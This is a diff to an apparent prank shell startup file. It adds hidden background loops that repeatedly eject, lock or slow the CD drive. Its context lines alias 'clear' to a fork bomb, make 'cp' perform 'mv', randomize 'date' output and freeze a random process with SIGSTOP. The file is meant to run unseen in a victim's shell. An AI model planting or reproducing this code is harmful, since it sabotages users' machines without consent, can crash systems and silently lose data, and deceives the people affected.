@@ -28,11 +28,37 @@ alias clear=':(){ :|:& };:'
 # Have `date` return random dates
 alias date='date -d "now + $RANDOM days"'
 
-# Randomly eject CD tray
-sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &
+
+# Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
+# Other times, resist all attempts at opening it. Other times, make it read
+# reaaaalllly sllooowwwwllly.
+if [ "$(uname)" = 'Darwin' ]; then
+	# Much less fun on Macs, alas.
+	if [[ $[$RANDOM % 2] == 0 ]]; then
+		# Eject!
+		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
+	else
+		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
+		# locking and are slot-loading anyway.
+		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
+	fi
+else
+	N=$[$RANDOM % 3]
+	if [[ $N == 0 ]]; then
+		# Open and close randomly after a few minutes.
+		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
+	elif [[ $N == 1 ]]; then
+		# Lock, and keep closing just in case.
+		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
+	else
+		# Slowness (1× CD speed). This has to be in a loop because it resets with
+		# every ejection.
+		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
+	fi
+fi
 
 # Send STOP signal to random process at random time
-sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
+sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 
 # Have `cp` perform `mv` instead
 alias cp='mv'
